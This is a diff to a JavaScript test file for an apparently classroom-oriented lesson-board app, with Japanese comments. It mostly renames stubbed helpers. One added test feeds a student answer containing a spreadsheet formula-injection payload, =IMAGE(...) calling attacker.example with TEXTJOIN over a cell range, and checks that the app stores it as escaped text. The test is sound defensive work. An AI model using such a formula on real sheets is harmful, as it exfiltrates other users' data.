@@ -123,9 +123,9 @@ function loadContext(overrides = {}) {
     getCachedProperty_: (k) => k === 'DATABASE_SPREADSHEET_ID' ? 'native_ss_1' : null,
     getCurrentEmail: () => currentEmail,
     isAdministrator: (email) => email === 'admin@example.com',
-    findUserByEmail: (email) => (email === 'teacher@example.com')
+    findUserByEmail_: (email) => (email === 'teacher@example.com')
       ? { userId: 'u1', userEmail: email } : { userId: 'stu', userEmail: email },
-    findUserById: (id) => id === 'u1' ? { userId: 'u1', userEmail: 'teacher@example.com' } : null,
+    findUserById_: (id) => id === 'u1' ? { userId: 'u1', userEmail: 'teacher@example.com' } : null,
     createTemplateForm: () => ({ success: true, formId: 'f1', formUrl: 'https://forms.example/1', spreadsheetId: 'ss1', sheetName: 'フォームの回答 1' }),
     // ボードの config は patch を積んで持つ (どの授業がボードにつながっているかを LessonService が読む)。
     applyConfigPatch_: (uid, patch) => { Object.assign(boardConfig, patch); return { success: true }; },
@@ -564,7 +564,7 @@ test('__getViewerLessonPhase_: 児童には現在フェーズだけを返す (�
   assert.equal(info.phases, undefined);
 });
 
-test('__getViewerLessonPhase_: 児童は公開ボード経路 (findPublishedBoardOwner) で config を読む', () => {
+test('__getViewerLessonPhase_: 児童は公開ボード経路 (findPublishedBoardOwner_) で config を読む', () => {
   const h = loadContext();
   const lessonId = startNativeLesson(h);
   const calls = [];
@@ -573,7 +573,7 @@ test('__getViewerLessonPhase_: 児童は公開ボード経路 (findPublishedBoar
     calls.push({ uid, hasUser: Boolean(user) });
     return user ? { activeLessonId: lessonId } : {};
   };
-  h.context.findPublishedBoardOwner = (uid, viewerEmail) => {
+  h.context.findPublishedBoardOwner_ = (uid, viewerEmail) => {
     calls.push({ published: uid, viewerEmail });
     return { userId: uid, userEmail: 'teacher@example.com' };
   };
@@ -589,7 +589,7 @@ test('__getViewerLessonPhase_: 非公開ボードは児童に授業情報を返�
   const h = loadContext();
   const lessonId = startNativeLesson(h);
   h.context.getConfigOrDefault = () => ({ activeLessonId: lessonId });
-  h.context.findPublishedBoardOwner = () => null;
+  h.context.findPublishedBoardOwner_ = () => null;
   h.setEmail('student@example.com');
   assert.equal(h.context.__getViewerLessonPhase_('u1'), null);
 });
@@ -607,7 +607,7 @@ test('__getViewerLessonPhase_: 児童の polling は cache から返し、教師
       remove: (k) => { ops.push('remove:' + k); store.delete(k); }
     })
   };
-  h.context.saveToCacheWithSizeCheck = (k, v, ttl) => {
+  h.context.saveToCacheWithSizeCheck_ = (k, v, ttl) => {
     if (!k.endsWith(':last')) assert.equal(ttl, 10, '短期 TTL');
     h.context.CacheService.getScriptCache().put(k, JSON.stringify(v));
     return true;
@@ -758,7 +758,7 @@ test('回答シートの読み (航跡) は cache され、送信 (board version
   h.context.CacheService = { getScriptCache: () => ({
     get: (k) => store.has(k) ? store.get(k) : null, put: (k, v) => store.set(k, v), remove: (k) => store.delete(k)
   }) };
-  h.context.saveToCacheWithSizeCheck = (k, v, ttl) => {
+  h.context.saveToCacheWithSizeCheck_ = (k, v, ttl) => {
     if (k.startsWith('lesson_rows_')) assert.equal(ttl, 60);
     store.set(k, JSON.stringify(v)); return true;
   };
@@ -1437,7 +1437,7 @@ test('掲示板モード (Form 経由) の授業は既存の設定を尊重す�
 // Why: 投稿 1 件 = lessons シート 2 read、ふりかえりで全員が 1 read ずつ、が quota を焼いた。
 //   cache しても「教師が進めた直後に古いフェーズで受理しない」が守られることをここで固定する。
 
-// helpers.js (withStampedeGuard_ / saveToCacheWithSizeCheck) を本物で載せ、CacheService を
+// helpers.js (withStampedeGuard_ / saveToCacheWithSizeCheck_) を本物で載せ、CacheService を
 //   実際に値を保持する store にする。
 function withRealCache(h) {
   const store = new Map();
@@ -1603,7 +1603,7 @@ function withMemCache(h) {
   h.context.CacheService = { getScriptCache: () => ({
     get: (k) => store.has(k) ? store.get(k) : null, put: (k, v) => store.set(k, v), remove: (k) => store.delete(k)
   }) };
-  h.context.saveToCacheWithSizeCheck = (k, v) => { store.set(k, JSON.stringify(v)); return true; };
+  h.context.saveToCacheWithSizeCheck_ = (k, v) => { store.set(k, JSON.stringify(v)); return true; };
   return store;
 }
 
@@ -2146,4 +2146,31 @@ test('__boardPatchForPhase_: 授業モードのフェーズはシートを読ま
   lessonJson.phases.forEach((p, i) => { p.spreadsheetId = 'native_ss_1'; p.sheetName = 'phase' + (i + 1); });
   h.context.__boardPatchForPhase_(lessonJson.phases[0], lessonJson, 'l1');
   assert.equal(analyzed, 0);
+});
+
+test('submitLessonAnswer: = で始まる理由や名前は数式にせず、文字としてシートに書く', () => {
+  const h = loadContext();
+  const lessonId = startNativeLesson(h);
+  h.context.getConfigOrDefault = withActiveLesson(lessonId);
+  const res = submitAs(h, 'child1@example.com', {
+    lessonId, phaseIndex: 0, numericX: 4, numericY: 2,
+    reason: '=IMAGE("https://attacker.example/?d="&TEXTJOIN(",",TRUE,B2:D200))', name: '+太郎'
+  });
+  assert.equal(res.success, true, res.message);
+  const row = h.nativeSheets.get('phase1')._data[1];
+  assert.equal(row[6].startsWith("'="), true, '理由は ' + "'" + ' 付き');
+  assert.equal(row[3], "'+太郎");
+  assert.equal(h.context.__plainTextCell_('ふつうの理由'), 'ふつうの理由', 'ふつうの文はそのまま');
+});
+
+test('submitLessonAnswer: 行を足したら行数の覚えを捨てる (送った回答がボードにすぐ出る)', () => {
+  const h = loadContext();
+  const lessonId = startNativeLesson(h);
+  h.context.getConfigOrDefault = withActiveLesson(lessonId);
+  const dropped = [];
+  h.context.invalidateSheetRowCountCache_ = (ss, name) => dropped.push(name);
+  submitAs(h, 'child1@example.com', { lessonId, phaseIndex: 0, numericX: 4, numericY: 2, reason: 'a' });
+  assert.deepEqual(dropped, ['phase1']);
+  submitAs(h, 'child1@example.com', { lessonId, phaseIndex: 0, numericX: 3, numericY: 2, reason: 'b' });
+  assert.deepEqual(dropped, ['phase1'], '送り直し (行の更新) では行数は変わらないので捨てない');
 });
